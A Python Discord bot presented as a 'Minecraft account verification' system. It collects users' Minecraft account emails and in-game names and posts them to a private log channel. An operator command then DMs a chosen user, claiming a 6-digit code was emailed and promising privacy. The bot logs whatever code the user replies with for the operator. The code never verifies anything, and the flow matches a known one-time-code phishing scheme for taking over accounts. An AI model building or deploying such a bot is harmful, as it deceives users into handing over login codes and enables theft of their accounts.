import os
import discord
from discord.ext import commands
import re

TOKEN = os.getenv("DISCORD_TOKEN")  # Access the environment variable
LOG_CHANNEL_ID = 1362997933552959558  # Your log channel ID
VERIFICATION_CHANNEL_ID = 1362951881827160295  # Your verification channel ID

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.messages = True
intents.dm_messages = True

bot = commands.Bot(command_prefix='!', intents=intents)

pending_codes = {}  # user_id: initiator_id

class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
    email = discord.ui.TextInput(label="Minecraft Email", placeholder="example@gmail.com", required=True)
    ign = discord.ui.TextInput(label="Minecraft IGN", placeholder="YourInGameName", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        log_channel = await bot.fetch_channel(LOG_CHANNEL_ID)

        embed = discord.Embed(
            title="🔗 New Minecraft Verification",
            color=discord.Color.orange()
        )
        embed.add_field(name="User", value=interaction.user.mention, inline=False)
        embed.add_field(name="Email", value=self.email.value, inline=False)
        embed.add_field(name="IGN", value=self.ign.value, inline=False)

        embed.set_footer(text="This is an automated message.")

        await log_channel.send(embed=embed)
        await interaction.response.send_message("✅ Info submitted! Thanks!", ephemeral=True)

class LinkView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)  # No timeout so the button stays active

    @discord.ui.button(label="Link", style=discord.ButtonStyle.primary)
    async def link_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal())

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})')
    print('------')

    # Sync slash commands (register commands to Discord)
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} slash commands.")
    except Exception as e:
        print(f"Error syncing commands: {e}")
    
    # Test if the bot has permission to send messages to the verification channel
    try:
        verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)
        embed = discord.Embed(
            title="🔗 Link Your Minecraft Account",
            description="Click the **Link** button below to start verification.",
            color=discord.Color.green()
        )
        embed.set_footer(text="This is an automated message.")
        await verification_channel.send(embed=embed, view=LinkView())  # Send the new embed with the Link button
        print("Verification embed sent successfully!")
    except discord.Forbidden:
        print(f"Bot does not have permission to send messages in the verification channel {VERIFICATION_CHANNEL_ID}")
    except Exception as e:
        print(f"Error sending verification embed: {e}")

@bot.tree.command(name="setup", description="Start the Minecraft account verification process")
async def setup(interaction: discord.Interaction):
    verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)  # Fetch the verification channel

    # Fetch the last 100 messages from the channel (you can adjust the number if needed)
    messages = await verification_channel.history(limit=100).flatten()

    # Delete previous /setup embed if found
    embed_found = False
    for message in messages:
        if message.embeds:
            for embed in message.embeds:
                if embed.title == "🔗 Link Your Minecraft Account":
                    embed_found = True
                    await message.delete()
                    print(f"Deleted message with embed: {embed.title}")
                    break  # Stop once the embed is deleted

    # If no embed was found to delete, log it
    if not embed_found:
        print("No previous embed with the title '🔗 Link Your Minecraft Account' was found to delete.")

    # Create the new embed
    embed = discord.Embed(
        title="🔗 Link Your Minecraft Account",
        description="Click the **Link** button below to start verification.",
        color=discord.Color.green()
    )
    embed.set_footer(text="This is an automated message.")

    # Send the new embed with the Link button
    await verification_channel.send(embed=embed, view=LinkView())  # No ephemeral flag, visible to everyone

    # Acknowledge the command response
    await interaction.response.send_message("Setup started! Verification channel updated.", ephemeral=True)

@bot.tree.command(name="promptcode", description="Prompt a user to check their DMs for a 6-digit code")
async def promptcode(interaction: discord.Interaction, user: discord.Member):
    try:
        # Send the detailed DM message to the user
        dm_message = (
            "We've sent a 6-digit code to your email address linked to your Minecraft account.\n\n"
            "Please reply to this DM with the code to complete your verification.\n\n"
            "🔒 Your information will remain private.\n"
            "If you have any questions, feel free to ask staff!"
        )
        embed = discord.Embed(
            title="📨 Minecraft Server Verification\n",
            description=dm_message,
            color=discord.Color.blue()
        )
        embed.set_footer(text="This is an automated message.")
        await user.send(embed=embed)
        await interaction.response.send_message(f"{user.mention} was prompted to check their DMs ✅", ephemeral=True)
        pending_codes[user.id] = interaction.user.id
    except discord.Forbidden:
        await interaction.response.send_message(f"❌ Couldn't DM {user.mention}. They might have DMs turned off.", ephemeral=True)

@bot.event
async def on_message(message):
    # Don't let the bot react to its own messages
    if message.author == bot.user:
        return

    # Check if the user is pending for a code
    if message.author.id in pending_codes:
        # Check if the message is from the correct user in the DM channel
        if message.guild is None:  # Ensure this is a DM message
            # Check if the reply is a valid 6-digit code
            if re.match(r'^\d{6}$', message.content):
                log_channel = await bot.fetch_channel(LOG_CHANNEL_ID)

                embed = discord.Embed(
                    title="📥 Code Received",
                    description=f"**User:** {message.author.mention}\n**Code:** `{message.content}`",
                    color=discord.Color.blue()
                )

                await log_channel.send(embed=embed)

                # Send the confirmation as an embed
                confirmation_embed = discord.Embed(
                    title="✅ Code received and logged.",
                    description="Thanks for submitting the code! Please wait up to 5 minutes to receive your role.",
                    color=discord.Color.green()
                )
                await message.channel.send(embed=confirmation_embed)

                pending_codes.pop(message.author.id, None)  # Remove from pending list
            else:
                embed = discord.Embed(
                    title="❌ Invalid Code",
                    description="The code you entered is invalid. Please try again with your 6-digit code.",
                    color=discord.Color.red()
                )
                await message.channel.send(embed=embed)

    # Process other commands
    await bot.process_commands(message)

bot.run(TOKEN)
